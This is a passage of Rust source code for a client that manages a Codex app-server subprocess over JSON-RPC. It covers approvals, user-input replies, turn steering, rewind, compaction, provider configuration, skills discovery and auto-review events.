                let interrupt = if decision == ApprovalDecision::Cancel {
                    pending.cancel_interrupt.clone()
                } else {
                    None
                };
                send_json(
                    &mut self.stdin,
                    &json!({ "id": pending.rpc_id, "result": result }),
                )
                .map_err(|e| e.to_string())?;
                self.approvals.remove(&request_id);
                self.events
                    .emit(AgentEvent::ApprovalResolved {
                        request_id,
                        decision,
                    })
                    .await;
                if let Some(params) = interrupt {
                    self.request("turn/interrupt", params, PendingRequest::Interrupt)?;
                }
                Ok(())
            }
            SessionCommand::RespondUserInput {
                request_id,
                answers,
            } => {
                if let Some(json_rpc_id) = self.user_inputs.remove(&request_id) {
                    // Native result shape: `{answers: {<qid>: {answers: [<strings>]}}}`
                    // — a single string is wrapped into a 1-element array.
                    let mut wire_answers = serde_json::Map::new();
                    for (qid, value) in &answers {
                        wire_answers
                            .insert(qid.clone(), json!({ "answers": strings(Some(value)) }));
                    }
                    send_json(
                        &mut self.stdin,
                        &json!({ "id": json_rpc_id, "result": { "answers": wire_answers } }),
                    )
                    .map_err(|e| e.to_string())?;
                } else if let Some(pending) = self.elicitations.remove(&request_id) {
                    let result = elicitation_result(&pending.fields, &answers);
                    send_json(
                        &mut self.stdin,
                        &json!({ "id": pending.rpc_id, "result": result }),
                    )
                    .map_err(|e| e.to_string())?;
                } else if self
                    .async_questions
                    .as_ref()
                    .is_some_and(|(id, _)| *id == request_id)
                {
                    let (_, questions) = self.async_questions.take().unwrap_or_default();
                    self.steer_async_question_reply(&request_id, &questions, &answers)
                        .await?;
                } else {
                    self.events
                        .emit(AgentEvent::Warning {
                            message: format!("unknown Codex user-input request id: {request_id}"),
                        })
                        .await;
                    return Ok(());
                }
                self.events
                    .emit(AgentEvent::UserInputResolved {
                        request_id,
                        answers,
                    })
                    .await;
                Ok(())
            }
            SessionCommand::SetOption { id, value } => {
                if id == "permissions" {
                    let value = value.as_str().ok_or("Codex permissions must be a string")?;
                    let value = if value == "guardian_subagent" {
                        "auto_review"
                    } else {
                        value
                    };
                    permission_params(value, true)?;
                    let OptionDescriptor::Select { options, .. } = &self.permission_descriptor
                    else {
                        unreachable!()
                    };
                    if !options
                        .iter()
                        .any(|option| option.value == value && option.unavailable.is_none())
                    {
                        return Err(format!("Codex permission value is unavailable: {value}"));
                    }
                    self.requested_permission = value.into();
                } else if id == "reasoningEffort" {
                    self.effort = value.as_str().map(str::to_owned);
                } else if id == "serviceTier" {
                    self.service_tier = value.as_str().map(str::to_owned);
                }
                Ok(())
            }
            SessionCommand::Steer {
                request_id,
                text,
                attachments,
            } => {
                // Native same-turn steering: `turn/steer` injects the message
                // into the ALREADY-RUNNING turn (the model picks it up at its
                // next input checkpoint) and resolves with the *same* turnId —
                // no new turn is started, so there is no extra `turn/started`
                // and our turn accounting stays intact.
                //
                // `expectedTurnId` is a required precondition: the app-server
                // rejects the request when it does not match the active turn,
                // which is exactly the race we want to lose loudly rather than
                // silently start a second turn.
                let Some(turn_id) = self.active_turn.clone() else {
                    self.events
                        .emit(AgentEvent::SteerRejected { request_id })
                        .await;
                    return Ok(());
                };
                let files = workspace_files(&attachments);
                let mut params = json!({"threadId":self.thread_id,"expectedTurnId":turn_id,
                    "input":user_input(&text, &attachments)});
                if !files.is_empty() {
                    if !self.protocol.steer_context {
                        // thread/inject_items has no expectedTurnId. A rejected steer
                        // would leave its files in the history of a different turn.
                        self.events.emit(AgentEvent::ControlDelivery {
                            request_id, operation: "steer".into(), status: "failed".into(),
                            error: Some(json!({"code":"codex.attachment_steer_unsupported",
                                "message":"当前 Codex 协议无法随引导消息独立传递普通文件。请作为下一条消息发送，或启用支持 turn/steer.additionalContext 的实验协议。"})),
                        }).await;
                        return Ok(());
                    }
                    add_file_context(&mut params, &files);
                }
                self.request(
                    "turn/steer", params,
                    PendingRequest::Steer { request_id, text },
                )
            }
            SessionCommand::Rewind { checkpoint_id, mode } => {
                if mode != crate::RewindMode::Conversation || !self.protocol.methods.contains("thread/revert") {
                    self.events.emit(AgentEvent::RewindFailed {
                        checkpoint_id, mode,
                        failure: RewindFailure::new(RewindFailureReason::Unsupported, Some("Codex supports native conversation revert only".into())),
                    }).await;
                    return Ok(());
                }
                self.request("thread/revert", json!({"threadId":self.thread_id,"beforeTurnId":checkpoint_id}), PendingRequest::RewindApply { checkpoint:checkpoint_id.clone(), mode })
            }
            // Progress arrives as the `contextCompaction` item, mid-turn or on its own.
            SessionCommand::Compact => self.request(
                "thread/compact/start",
                json!({ "threadId": self.thread_id }),
                PendingRequest::Compact,
            ),
            SessionCommand::SetGoal { objective, status } => {
                let mut params = json!({ "threadId": self.thread_id, "origin": "user" });
                if let Some(objective) = objective {
                    params["objective"] = json!(objective);
                }
                if let Some(status) = status {
                    params["status"] = json!(goal_status_wire(status));
                }
                self.request("thread/goal/set", params, PendingRequest::GoalChange)
            }
            SessionCommand::ClearGoal => self.request(
                "thread/goal/clear",
                json!({ "threadId": self.thread_id, "origin": "user" }),
                PendingRequest::GoalChange,
            ),
            SessionCommand::PreviewRewind { checkpoint_id, mode } => {
                self.events.emit(AgentEvent::RewindPreviewed {
                    checkpoint_id,
                    mode,
                    files: None,
                    reason: None,
                }).await;
                Ok(())
            }
            SessionCommand::UndoRewind { checkpoint_id, .. } => {
                self.events.emit(AgentEvent::RewindUndoFailed {
                    checkpoint_id,
                    failure: RewindFailure::new(
                        RewindFailureReason::Unsupported,
                        Some("Codex keeps no rewind undoable".into()),
                    ),
                }).await;
                Ok(())
            }
            SessionCommand::StopBackgroundTask { task_id } => {
                let thread_id = self.thread_id.clone();
                let (method, params) = match task_id {
                    Some(process_id) => (
                        "thread/backgroundTerminals/terminate",
                        json!({ "threadId": thread_id, "processId": process_id }),
                    ),
                    None => (
                        "thread/backgroundTerminals/clean",
                        json!({ "threadId": thread_id }),
                    ),
                };
                self.request(method, params, PendingRequest::Compact)
            }
            SessionCommand::Shutdown => Ok(()),
        }
    }

    async fn handle_transport(
        &mut self,
        item: Result<ChildOutput, smol::channel::RecvError>,
    ) -> TransportOutcome {
        match item {
            Ok(ChildOutput::Line(line)) => {
                self.handle_line(&line).await;
                TransportOutcome::Continue
            }
            Ok(ChildOutput::Eof) | Err(_) => {
                let status = self.child.try_wait().ok().flatten();
                TransportOutcome::Closed(match status {
                    Some(status) => format!("codex app-server exited with {status}"),
                    None => "codex app-server closed stdout".into(),
                })
            }
            Ok(ChildOutput::Error(err)) => TransportOutcome::Fatal(err),
        }
    }

    fn wake_at(&self) -> Option<std::time::Instant> {
        self.retry_deadline
    }

    async fn wake(&mut self) -> Result<(), String> {
        if self.retry.is_none()
            || self
                .pending_requests
                .values()
                .any(|request| matches!(request, PendingRequest::TurnStart { .. } | PendingRequest::AttachmentContext { .. }))
        {
            return Ok(());
        }
        self.retry_deadline = None;
        let mut params = self.build_turn_params("", self.last_turn_options.as_ref(), &[]);
        params["input"] = json!([]);
        self.request(
            "turn/start",
            params,
            PendingRequest::TurnStart {
                permission: self.requested_permission.clone(),
                settings: None,
            },
        )
    }

    async fn settle_shutdown(&mut self) {
        self.clear_retry().await;
        self.settle_pending_user_inputs_on_shutdown().await;
    }

    async fn teardown(mut self, reason: Option<String>) -> Option<String> {
        stop_child(&mut self.child, self.stdin);
        reason.map(|reason| describe_child_failure(reason, None, &mut self.stderr_tail))
    }
}

fn mcp_args(registrations: &[crate::McpRegistration]) -> Vec<String> {
    registrations
        .iter()
        .flat_map(|mcp| ["-c".to_string(), mcp.codex_config_override()])
        .collect()
}

/// Append the child's exit status and captured stderr to a process-death
/// message, so the error shows the provider's own words instead of a bare
/// "exited".
fn describe_child_failure(
    base: String,
    status: Option<std::process::ExitStatus>,
    stderr_tail: &mut StderrTail,
) -> String {
    let mut message = base;
    if let Some(status) = status {
        message.push_str(&format!(" ({status})"));
    }
    stderr_tail.append_to(message, "\nstderr:\n")
}

/// Fold the child's death into a startup error. Protocol errors and I/O
/// errors (an EPIPE means the child died mid-handshake) both make the process
/// itself the story; Spawn/Provider errors already carry their own
/// explanation and pass through untouched.
fn enrich_startup_error(
    err: AgentError,
    status: Option<std::process::ExitStatus>,
    stderr_tail: &mut StderrTail,
) -> AgentError {
    match err {
        AgentError::Protocol(message) => {
            AgentError::Protocol(describe_child_failure(message, status, stderr_tail))
        }
        AgentError::Io(io) => AgentError::Protocol(describe_child_failure(
            format!("I/O error talking to codex: {io}"),
            status,
            stderr_tail,
        )),
        other => other,
    }
}

/// Bind a custom endpoint to a named provider instead of relying on the
/// built-in OpenAI provider's authentication mode. Later environment pairs win.
pub fn provider_args(env: &[(String, String)]) -> Result<Vec<String>, AgentError> {
    let value = |key: &str| env.iter().rev().find(|(name, _)| name == key)
        .map(|(_, value)| value.trim()).filter(|value| !value.is_empty());
    let mut args = Vec::new();
    let mut set = |key: &str, value: toml::Value| {
        args.extend(["-c".to_owned(), format!("{key}={value}")]);
    };
    if let Some(url) = value("OPENAI_BASE_URL") {
        set("model_provider", toml::Value::String("muteki".into()));
        set("model_providers.muteki.name", toml::Value::String("muteki".into()));
        set("model_providers.muteki.base_url", toml::Value::String(url.into()));
        set("model_providers.muteki.wire_api", toml::Value::String(
            value("MUTEKI_CODEX_WIRE_API").unwrap_or("responses").into()));
        set("model_providers.muteki.env_key", toml::Value::String("OPENAI_API_KEY".into()));
        return Ok(args);
    }
    // Explicit overrides also survive exec --ignore-user-config. Native
    // app-server otherwise reads the same file directly.
    let Some(home) = value("CODEX_HOME") else { return Ok(args); };
    let path = Path::new(home).join("config.toml");
    let raw = match std::fs::read_to_string(&path) {
        Ok(raw) => raw,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(args),
        Err(error) => return Err(AgentError::Provider(format!("cannot read Codex provider config: {error}"))),
    };
    let config: toml::Value = toml::from_str(&raw)
        .map_err(|_| AgentError::Provider("invalid Codex provider config.toml".into()))?;
    let Some(provider) = config.get("model_provider").and_then(toml::Value::as_str)
        .filter(|provider| !provider.is_empty() && *provider != "openai") else { return Ok(args); };
    let Some(block) = config.get("model_providers").and_then(|providers| providers.get(provider))
        else { return Ok(args); };
    set("model_provider", toml::Value::String(provider.into()));
    for field in ["name", "base_url", "wire_api", "env_key", "requires_openai_auth"] {
        if let Some(value) = block.get(field) {
            set(&format!("model_providers.{}.{field}", toml::Value::String(provider.into())), value.clone());
        }
    }
    Ok(args)
}

fn spawn_server(
    binary_path: Option<&Path>,
    extra_args: &[String],
    launch_env: &LaunchEnv,
) -> Result<
    (
        Child,
        BufWriter<ChildStdin>,
        Receiver<ChildOutput>,
        StderrTail,
    ),
    AgentError,
> {
    // Absolute path: bare names break once a child sets its own cwd.
    let binary = crate::resolve_binary(binary_path, "codex")?;
    let mut cmd = crate::process::command(&binary);
    let mut env: Vec<_> = std::env::vars().collect();
    env.extend(launch_env.pairs(ProviderKind::Codex));
    cmd.arg("app-server")
        .args(provider_args(&env)?)
        .args(extra_args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    // Per-provider environment (Settings → Providers): custom variables and the
    // `CODEX_HOME` override (the account-scoped "shadow home", when set).
    for (key, value) in launch_env.pairs(ProviderKind::Codex) {
        cmd.env(key, value);
    }
    if let Some(home) = &launch_env.home {
        // Codex refuses to start against a CODEX_HOME that does not exist.
        if let Err(err) = std::fs::create_dir_all(home) {
            log::warn!("could not create CODEX_HOME {}: {err}", home.display());
        }
    }
    let mut child = cmd
        .spawn()
        .map_err(|err| AgentError::Spawn(err.to_string()))?;
    let stdin = BufWriter::new(
        child
            .stdin
            .take()
            .ok_or_else(|| AgentError::Spawn("missing child stdin".into()))?,
    );
    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| AgentError::Spawn("missing child stdout".into()))?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| AgentError::Spawn("missing child stderr".into()))?;
    let (rx, reader) = spawn_line_reader(
        stdout,
        "codex-app-server-stdout",
        Some("failed reading codex stdout"),
        false,
    );
    reader.map_err(|err| AgentError::Spawn(err.to_string()))?;
    let stderr_tail = StderrTail::default();
    stderr_tail
        .spawn(stderr, "codex-app-server-stderr", "codex app-server")
        .map_err(|err| AgentError::Spawn(err.to_string()))?;
    Ok((child, stdin, rx, stderr_tail))
}

struct OpenedThread {
    thread_id: String,
    model: Option<String>,
    next_id: i64,
    provider_commands: Vec<ProviderCommand>,
    permission_descriptor: OptionDescriptor,
    effective_permission: String,
}

async fn initialize_and_open_thread(
    opts: &SessionOptions,
    stdin: &mut BufWriter<ChildStdin>,
    lines: &Receiver<ChildOutput>,
    protocol:&protocol::Protocol,
    events: &Sender<AgentEvent>,
) -> Result<OpenedThread, AgentError> {
    let experimental = opts.launch_env.env.iter().rev().find(|(key,_)|key == "MUTEKI_CODEX_EXPERIMENTAL_API")
        .map(|(_,value)|value == "true" || value == "1").unwrap_or(false);
    initialize_with_capabilities(stdin,lines,experimental).await?;
    if opts.fork&&opts.resume.as_ref().is_some_and(|cursor|cursor.0.get("last_turn_id").is_some())&&!protocol.fork_at_turn{return Err(AgentError::Protocol("Installed Codex does not advertise fork at a native turn boundary".into()));}

    let cwd = opts.cwd.to_string_lossy();
    let permission = requested_permission(&opts.option_selections);
    let (method, mut params) = if let Some(resume) = &opts.resume {
        resume_request(resume, opts.fork, &cwd)?
    } else {
        (
            "thread/start",
            json!({
                "cwd": cwd,
            }),
        )
    };
    params.as_object_mut().expect("thread params").extend(
        permission_params(&permission, false)
            .map_err(AgentError::Protocol)?
            .as_object()
            .expect("permission params")
            .clone(),
    );
    if !protocol.additional_context {
        if let Some(instructions) = opts.instructions.as_deref().filter(|value| !value.is_empty()) {
            params["developerInstructions"] = json!(instructions);
        }
    }
    if let Some(model) = &opts.model {
        params["model"] = json!(model);
    }
    if let Some(tier) = codex_service_tier(&opts.option_selections) {
        params["serviceTier"] = json!(tier);
    }
    if let Some(config) = thread_config(&opts.option_selections) {
        params["config"] = config;
    }
    send_json(
        stdin,
        &json!({ "id": 2, "method": method, "params": params }),
    )?;
    let result = wait_for_response(lines, 2).await?;
    let thread_id = result
        .pointer("/thread/id")
        .and_then(Value::as_str)
        .ok_or_else(|| {
            AgentError::Protocol(format!("{method} response omitted thread.id: {result}"))
        })?
        .to_owned();
    let model = result
        .get("model")
        .and_then(Value::as_str)
        .map(str::to_owned)
        .or_else(|| opts.model.clone());
    let effective_permission = effective_permission(&result);

    let mut next_id = 3;
    if method != "thread/resume" && let Some(name) = thread_section_name(opts) {
        match resolve_thread_section(name, stdin, lines, protocol, &mut next_id).await {
            Ok(section_id) => {
                let id = next_id;
                next_id += 1;
                let moved = async {
                    send_json(stdin, &json!({"id":id,"method":"thread/section/move","params":{"threadId":thread_id,"sectionId":section_id}}))?;
                    wait_for_response(lines, id).await
                }.await;
                if let Err(error) = moved {
                    events.emit(AgentEvent::Warning { message: format!("Codex 自动归集失败（{name}）：{error}") }).await;
                }
            }
            Err(error) => {
                events.emit(AgentEvent::Warning { message: format!("Codex 自动归集不可用（{name}）：{error}") }).await;
            }
        }
    }

    // Discover the session's skills for the composer's `$` menu. Supported since
    // codex 0.144.1 (verified live); a failure is non-fatal so older builds
    // still start. The app-server expands a `$name` mention in plain turn text
    // itself; it has no request to list or run `~/.codex/prompts` files, so
    // those are not offered.
    let profiles = request_permission_profiles(&opts.cwd, stdin, lines, &mut next_id)
        .await
        .unwrap_or_else(|err| {
            log::debug!("Codex permissionProfile/list unavailable: {err}");
            Vec::new()
        });
    let permission_descriptor = permission_descriptor(&profiles, &effective_permission, &result);
    let provider_commands = match request_codex_skills(&opts.cwd, stdin, lines, next_id).await {
        Ok(commands) => commands,
        Err(err) => {
            log::debug!("codex skills/list unavailable: {err}");
            Vec::new()
        }
    };
    next_id += 1;
    Ok(OpenedThread {
        thread_id,
        model,
        next_id,
        provider_commands,
        permission_descriptor,
        effective_permission,
    })
}

async fn resolve_thread_section(
    name: &str,
    stdin: &mut BufWriter<ChildStdin>,
    lines: &Receiver<ChildOutput>,
    protocol: &protocol::Protocol,
    next_id: &mut i64,
) -> Result<String, AgentError> {
    if !protocol.methods.contains("threadSection/list") || !protocol.methods.contains("thread/section/move") {
        return Err(AgentError::Protocol("Installed Codex does not advertise thread sections".into()));
    }
    let mut cursor = Value::Null;
    loop {
        let id = *next_id;
        *next_id += 1;
        send_json(stdin, &json!({"id":id,"method":"threadSection/list","params":{"cursor":cursor}}))?;
        let result = wait_for_response(lines, id).await?;
        let sections = result["data"].as_array().ok_or_else(|| AgentError::Protocol("threadSection/list omitted data".into()))?;
        if let Some(section) = sections.iter().find(|section| section["name"].as_str() == Some(name)) {
            return section["id"].as_str().map(str::to_owned)
                .ok_or_else(|| AgentError::Protocol("threadSection/list omitted section id".into()));
        }
        cursor = result.get("nextCursor").cloned().unwrap_or(Value::Null);
        if cursor.as_str().is_none_or(str::is_empty) {
            return Err(AgentError::Protocol(format!("Codex 分组不存在：{name}")));
        }
    }
}

fn resume_request(
    resume: &ResumeCursor,
    fork: bool,
    cwd: &str,
) -> Result<(&'static str, Value), AgentError> {
    let thread_id = resume.str_field(&["thread_id"]).ok_or_else(|| {
        AgentError::Protocol("Codex resume cursor is missing string field `thread_id`".into())
    })?;
    Ok((
        if fork { "thread/fork" } else { "thread/resume" },
        {let mut params=json!({"threadId":thread_id,"cwd":cwd,"excludeTurns":true});if fork{if let Some(last)=resume.0.get("last_turn_id"){params["lastTurnId"]=last.clone();}}params},
    ))
}

async fn request_permission_profiles(
    cwd: &Path,
    stdin: &mut BufWriter<ChildStdin>,
    lines: &Receiver<ChildOutput>,
    next_id: &mut i64,
) -> Result<Vec<Value>, AgentError> {
    let mut cursor = Value::Null;
    let mut profiles = Vec::new();
    loop {
        let id = *next_id;
        *next_id += 1;
        send_json(
            stdin,
            &json!({"id":id, "method":"permissionProfile/list", "params":{"cwd":cwd.to_string_lossy(), "cursor":cursor}}),
        )?;
        let result = wait_for_response(lines, id).await?;
        if let Some(entries) = result.get("data").and_then(Value::as_array) {
            profiles.extend(entries.iter().cloned());
        }
        cursor = result.get("nextCursor").cloned().unwrap_or(Value::Null);
        if cursor.as_str().is_none_or(str::is_empty) {
            break;
        }
    }
    Ok(profiles)
}

/// Query `skills/list` for `cwd` and map the entries into `Skill`-kind
/// [`ProviderCommand`]s. The response shape (verified against codex 0.144.1) is
/// `{data: [{cwd, skills: [{name, description, interface:{…}}]}]}`.
async fn request_codex_skills(
    cwd: &Path,
    stdin: &mut BufWriter<ChildStdin>,
    lines: &Receiver<ChildOutput>,
    id: i64,
) -> Result<Vec<ProviderCommand>, AgentError> {
    send_json(
        stdin,
        &json!({ "id": id, "method": "skills/list", "params": { "cwds": [cwd.to_string_lossy()] } }),
    )?;
    let result = wait_for_response(lines, id).await?;
    Ok(parse_codex_skills(&result))
}

/// Flatten a `skills/list` response into `Skill`-kind [`ProviderCommand`]s
/// (deduped by name, empty names dropped).
fn parse_codex_skills(result: &Value) -> Vec<ProviderCommand> {
    let mut seen = std::collections::HashSet::new();
    let mut out = Vec::new();
    let Some(entries) = result.get("data").and_then(Value::as_array) else {
        return out;
    };
    for entry in entries {
        let Some(skills) = entry.get("skills").and_then(Value::as_array) else {
            continue;
        };
        for skill in skills {
            let Some(name) = skill.get("name").and_then(Value::as_str) else {
                continue;
            };
            let name = name.trim();
            if name.is_empty() || !seen.insert(name.to_owned()) {
                continue;
            }
            let description = skill
                .get("description")
                .and_then(Value::as_str)
                .or_else(|| {
                    skill
                        .pointer("/interface/shortDescription")
                        .and_then(Value::as_str)
                })
                .map(str::to_owned)
                .filter(|s| !s.is_empty());
            out.push(ProviderCommand {
                name: name.to_owned(),
                description,
                kind: ProviderCommandKind::Skill,
            });
        }
    }
    out
}

/// Render a JSON-RPC error object with everything the server sent — message,
/// code, and the `data` payload — falling back to the raw JSON when even the
/// message is missing. Losing any of it makes provider failures undiagnosable.
fn describe_rpc_error(error: &Value) -> String {
    let Some(message) = error.get("message").and_then(Value::as_str) else {
        return error.to_string();
    };
    let mut out = message.to_owned();
    if let Some(code) = error.get("code").and_then(Value::as_i64) {
        out.push_str(&format!(" (code {code})"));
    }
    if let Some(data) = error.get("data").filter(|data| !data.is_null()) {
        out.push_str(&format!(": {data}"));
    }
    out
}

async fn wait_for_response(lines: &Receiver<ChildOutput>, id: i64) -> Result<Value, AgentError> {
    loop {
        match lines
            .recv()
            .await
            .map_err(|_| AgentError::Protocol("codex stdout closed during startup".into()))?
        {
            ChildOutput::Line(line) => {
                let value: Value = serde_json::from_str(&line).map_err(|err| {
                    AgentError::Protocol(format!("invalid JSON from codex: {err}: {line}"))
                })?;
                if value.get("id").and_then(Value::as_i64) != Some(id) {
                    continue;
                }
                if let Some(error) = value.get("error") {
                    return Err(AgentError::Provider(describe_rpc_error(error)));
                }
                return value
                    .get("result")
                    .cloned()
                    .ok_or_else(|| AgentError::Protocol(format!("response {id} omitted result")));
            }
            ChildOutput::Eof => {
                return Err(AgentError::Protocol("codex exited during startup".into()));
            }
            ChildOutput::Error(err) => return Err(AgentError::Protocol(err)),
        }
    }
}

fn stop_child(child: &mut Child, stdin: BufWriter<ChildStdin>) {
    drop(stdin);
    if child.try_wait().ok().flatten().is_none() {
        let _ = child.kill();
    }
    let _ = child.wait();
}

fn send_json(stdin: &mut BufWriter<ChildStdin>, value: &Value) -> Result<(), AgentError> {
    write_json(stdin, value, None)
}

/// Wait briefly for a child that has already closed stdout to become waitable.
/// Startup failures are rare, and preserving the real exit code is worth this
/// bounded delay. A child that remains alive is still killed by `stop_child`.
fn settle_child_exit(child: &mut Child) -> Option<std::process::ExitStatus> {
    for _ in 0..50 {
        match child.try_wait() {
            Ok(Some(status)) => return Some(status),
            Ok(None) => std::thread::sleep(std::time::Duration::from_millis(10)),
            Err(_) => return None,
        }
    }
    None
}

impl Actor {
    async fn capture_read_image(&mut self, item: &mut ThreadItem) {
        use base64::Engine as _;
        let ItemContent::ImageRead { path, image } = &mut item.content else {
            return;
        };
        if let Some(ThreadItem {
            content: ItemContent::ImageRead {
                image: Some(saved), ..
            },
            ..
        }) = self.items.get(&item.id)
        {
            *image = Some(saved.clone());
            return;
        }
        let path = self.cwd.join(path);
        match smol::fs::read(&path).await {
            Ok(bytes) => {
                *image = Some(crate::Attachment {
                    media_type: match path.extension().and_then(|ext| ext.to_str()) {
                        Some("jpg" | "jpeg") => "image/jpeg",
                        Some("webp") => "image/webp",
                        Some("gif") => "image/gif",
                        _ => "image/png",
                    }
                    .into(),
                    data_base64: base64::engine::general_purpose::STANDARD.encode(bytes),
                    source_path: None,
                });
                self.items.insert(item.id.clone(), item.clone());
            }
            Err(error) => log::warn!("could not preserve image read {}: {error}", path.display()),
        }
    }

    async fn handle_auto_review(&mut self, params: &Value) {
        let review = params.get("review").unwrap_or(&Value::Null);
        let status = review
            .get("status")
            .and_then(Value::as_str)
            .unwrap_or("inProgress");
        let rationale = review
            .get("rationale")
            .and_then(Value::as_str)
            .unwrap_or_default();
        let risk = review
            .get("riskLevel")
            .and_then(Value::as_str)
            .unwrap_or("unknown");
        let Some(id) = params.get("reviewId").and_then(Value::as_str) else {
            return;
        };
        let summary = auto_review_action_summary(params.get("action").unwrap_or(&Value::Null));
        let detail = format!("Risk: {risk}. {summary}");
        let detail = if rationale.is_empty() {
            detail
        } else {
            format!("{rationale}\n{detail}")
        };
        let item_status = match status {
            "inProgress" => ItemStatus::InProgress,
            "approved" => ItemStatus::Completed,
            _ => ItemStatus::Failed,
        };
        let item = ThreadItem {
            id: id.into(),
            // parent_item_id routes items to subagent mirrors; the reviewed action stays in this chat.
            parent_item_id: None,
            content: ItemContent::ToolCall {
                presentation: None,
                image_reads: Vec::new(),
                name: "Auto-reviewer".into(),
                input: json!({"summary":summary, "targetItemId":params.get("targetItemId")}),
                output: Some(detail),
                status: item_status,
            },
        };
        self.events
            .emit(if item_status == ItemStatus::InProgress {
                AgentEvent::ItemStarted(item)
            } else {
                AgentEvent::ItemCompleted(item)
            })
            .await;
        if status != "denied" {
            return;
        }
        let Some(event) = guardian_event(params) else {
            return;
        };
        let Some(id) = event.get("id").and_then(Value::as_str) else {
            return;
        };
        let request_id = format!("guardian:{id}");
        if self.guardian_denials.contains_key(&request_id) {
            return;
        }
        self.guardian_denials.insert(request_id.clone(), json!({
            "threadId":params.get("threadId").and_then(Value::as_str).unwrap_or(&self.thread_id),
            "event":event,
        }));
        self.events
            .emit(AgentEvent::ApprovalRequested(ApprovalRequest {native_execution: Some(json!({"tool_name":"codex.guardian","arguments":params.get("action").cloned().unwrap_or(Value::Null),"action":"guardian_denied_action","resource_kind":"native_action","cwd":params["action"]["cwd"].as_str().unwrap_or("")})), tool_call_id: params["targetItemId"].as_str().map(str::to_owned),
                id: request_id,
                parent_item_id: None,
                turn_id: params
                    .get("turnId")
                    .and_then(Value::as_str)
                    .map(str::to_owned),
                kind: ApprovalKind::ToolUse {
                    name: "Codex auto-review".into(),
                    input: params.get("action").cloned().unwrap_or(Value::Null),
                    detail: rationale.into(),
                },
                options: vec![ApprovalOption {
                    id: "thread/approveGuardianDeniedAction".into(),
                    label: "Approve this action".into(),
                    kind: ApprovalOptionKind::AllowOnce,
                }],
            }))
            .await;
    }

    async fn emit_permissions(&mut self, settings: Option<&Value>) {
        if let OptionDescriptor::Select { options, .. } = &mut self.permission_descriptor {
            let existing = options
                .iter_mut()
                .find(|option| option.value == self.effective_permission);
            let inherited = self
                .effective_permission
                .strip_prefix("effective:")
                .and_then(|value| serde_json::from_str::<Value>(value).ok())
                .unwrap_or(Value::Null);
            match existing {
                Some(option)
                    if settings.is_some()
                        && option.unavailable.as_deref()
                            == Some("Inherited permission configuration") =>
                {
                    *option = current_permission_option(
                        &self.effective_permission,
                        settings.unwrap_or(&inherited),
                    );
                }
                None => options.push(current_permission_option(
                    &self.effective_permission,
                    settings.unwrap_or(&inherited),
                )),
                _ => {}
            }
        }
        self.events
            .emit(AgentEvent::ProviderOptions {
                descriptors: vec![self.permission_descriptor.clone()],
                selections: vec![OptionSelection {
                    id: "permissions".into(),
                    value: json!(self.effective_permission),
                }],
            })
            .await;
    }
    /// Compaction drops the developer message carrying the instructions, and Codex sends
    /// `additionalContext` again only when it changes; put it back as Codex rendered it, mid-turn
    /// included.
    fn restore_instructions(&mut self) {
        if !self.protocol.additional_context || !self.protocol.methods.contains("thread/inject_items") {
            return;
        }
        let Some(instructions) = &self.instructions else {
            return;
        };
        let params = json!({
            "threadId": self.thread_id,
            "items": instruction_entries(instructions).into_iter().map(|(key, text)| json!({
                "type": "message",
                "role": "developer",
                "content": [{
                    "type": "input_text",
                    "text": format!("<{key}>{text}</{key}>"),
                }],
            })).collect::<Vec<_>>(),
        });
        if let Err(err) = self.request("thread/inject_items", params, PendingRequest::InjectItems) {
            log::warn!("codex: could not restore instructions after compaction: {err}");
        }
    }

    async fn start_prepared_turn(&mut self, params: Value, delivery_id: u64) -> Result<(), String> {
        self.request("turn/start", params, PendingRequest::TurnStart {
            permission: self.requested_permission.clone(), settings: None,
        })?;
        self.events.emit(AgentEvent::TurnAccepted { delivery_id }).await;
        Ok(())
    }

    async fn fail_file_delivery(&self, message: String) {
        self.events.emit(AgentEvent::TurnFailed {
            code: "codex.attachment_context_failed".into(), message,
        }).await;
        self.events.emit(AgentEvent::TurnCompleted {
            turn_id: String::new(), status: TurnStatus::Failed, usage: None,
        }).await;
    }

    fn request(&mut self, method: &str, params: Value, kind: PendingRequest) -> Result<(), String> {
        let id = self.next_id;
        self.next_id += 1;
        send_json(
            &mut self.stdin,
            &json!({ "id": id, "method": method, "params": params }),
        )
        .map_err(|e| e.to_string())?;
        self.pending_requests.insert(id, kind);
        Ok(())
    }

    async fn clear_retry(&mut self) {
        self.retry_deadline = None;
        if self.retry.take().is_some() {
            self.events
                .emit(AgentEvent::TurnRetry { retry: None })
                .await;
        }
    }

    fn build_turn_params(
        &self,
        text: &str,
        options: Option<&TurnOptions>,
        attachments: &[Attachment],
    ) -> Value {
        let effort = options
            .and_then(|o| o.effort.clone())
            .or_else(|| self.effort.clone());

        let mut params = json!({
            "threadId": self.thread_id,
            "input": user_input(text, attachments),
        });
        if let Ok(permission) = permission_params(&self.requested_permission, true) {
            params
                .as_object_mut()
                .expect("turn params")
                .extend(permission.as_object().expect("permission params").clone());
        }
        if let Some(effort) = &effort {
            params["effort"] = json!(effort);
        }
        if let Some(tier) = &self.service_tier {
            params["serviceTier"] = json!(tier);
        }
        // Codex sends an entry to the model when its value changes, as a `<key>value</key>`
        // developer message beside the thread's developer instructions.
        if let Some(instructions) = &self.instructions
            && self.protocol.additional_context
        {
            params["additionalContext"] = Value::Object(instruction_entries(instructions).into_iter()
                .map(|(key, text)| (key, json!({"kind":"application","value":text}))).collect());
        }

        let model = self
            .model
            .clone()
            .unwrap_or_else(|| DEFAULT_MODEL.to_owned());
        if self.protocol.plan { params["collaborationMode"] = json!({
            "mode": options.and_then(|o|o.interaction_mode.as_deref()).unwrap_or("default"),
            "settings": {
                "model": model,
                "reasoning_effort": effort.clone().unwrap_or_else(|| "medium".to_owned()),
                "developer_instructions": null,
            }
        });

        }
        log::debug!(
            "codex turn/start: effort={:?} serviceTier={:?}",
            effort,
            self.service_tier
        );
        params
    }

    async fn handle_line(&mut self, line: &str) {
        let value: Value = match serde_json::from_str(line) {
            Ok(value) => value,
            Err(err) => {
                self.events
                    .emit(AgentEvent::Error {
                        message: format!("invalid JSON from codex: {err}: {line}"),
                        fatal: false,
                    })
                    .await;
                return;
            }
        };
        if value.get("method").is_some() && value.get("id").is_some() {
            self.handle_server_request(&value).await;
        } else if let Some(method) = value.get("method").and_then(Value::as_str) {
            self.handle_notification(method, value.get("params").unwrap_or(&Value::Null))
                .await;
        } else if let Some(id) = value.get("id").and_then(Value::as_i64) {
